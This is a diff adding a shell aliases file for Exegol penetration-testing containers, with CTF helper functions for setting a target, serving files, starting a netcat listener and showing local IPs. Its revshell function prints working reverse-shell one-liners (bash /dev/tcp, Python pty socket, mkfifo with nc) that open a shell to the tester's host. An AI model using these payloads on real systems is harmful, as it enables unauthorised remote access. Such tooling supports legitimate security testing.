@@ -1,0 +1,38 @@
+# Config file dedicated to the user's personal aliases shared between all exegol containers
+
+# CTF functions
+
+target() {
+    if [ -z "$1" ]; then
+        [ -n "$TARGET" ] && echo "$TARGET" || echo "usage: target <ip>"
+        return
+    fi
+    export TARGET="$1"
+    echo "$TARGET"
+}
+
+serve() {
+    python3 -m http.server "${1:-8000}"
+}
+
+listen() {
+    local port="${1:-4444}"
+    rlwrap nc -nlvp "$port" 2>/dev/null || nc -nlvp "$port"
+}
+
+myip() {
+    ip -o -4 addr show scope global | awk '{split($4,a,"/"); printf "  %-12s %s\n", $2, a[1]}'
+}
+
+revshell() {
+    local ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
+    [ -z "$ip" ] && ip=$(ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | grep -v '172.17' | head -1)
+    local port="${1:-4444}"
+    echo "  $ip:$port"
+    echo ""
+    echo "  bash -i >& /dev/tcp/$ip/$port 0>&1"
+    echo ""
+    echo "  python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+    echo ""
+    echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+}
